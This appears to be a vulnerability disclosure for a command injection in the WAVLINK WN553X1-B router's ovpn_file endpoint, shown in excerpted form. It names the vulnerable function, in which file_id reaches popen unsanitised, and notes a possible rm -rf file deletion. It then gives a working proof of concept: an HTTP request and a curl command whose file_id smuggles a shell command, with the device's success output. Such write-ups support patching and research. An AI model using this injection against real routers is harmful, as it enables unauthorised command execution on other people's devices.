# WAVLINK WN553X1-B Router — ovpn_file Command Injection
...
`POST /protocol.csp?fname=system&opt=ovpn_file&function=set&type=del HTTP/1.1`
...
The vulnerability resides in the `sub_4162A8` function of `/bin/ioos` (the `.csp` back-end on 127.0.0.1:81, behind lighttpd). When `function=set` and `type=del`, the user-controlled `file_id` parameter is passed to `snprintf` without any input validation or sanitization, and the resulting string is forwarded to `popen`:

![image-20260808173445714](./images/02.png)

```
snprintf(buf, 0x200, "uci show ovpnclient | grep \"file_id='%s'\"", file_id);
popen(buf, "r");   // 0x4163D0
```
...
![image-20260808174023983](./images/03.png)

The same function also builds `rm -rf "%s"` from a uci-stored path and passes it to `system` (0x4164F4), which may allow arbitrary file deletion.
...
Step 2 — command injection (note `function=set&type=del`; other combinations return error 10002):

```http
POST /protocol.csp?fname=system&opt=ovpn_file&function=set&type=del&file_id=a%22%3B/usr/bin/id%3E/tmp/pwn%3B%22&token=<TOKEN> HTTP/1.1
Host: <target>
Content-Length: 0
Connection: close
...
```
$ curl -X POST "http://<target>/protocol.csp?fname=system&opt=ovpn_file&function=set&type=del&file_id=a%22%3B/usr/bin/id%3E/tmp/v_ovpnf%3B%22&token=<TOKEN>"
{ "opt": "ovpn_file", "fname": "system", "function": "set", "error": 0 }

$ cat /tmp/v_ovpnf      # on the emulated device
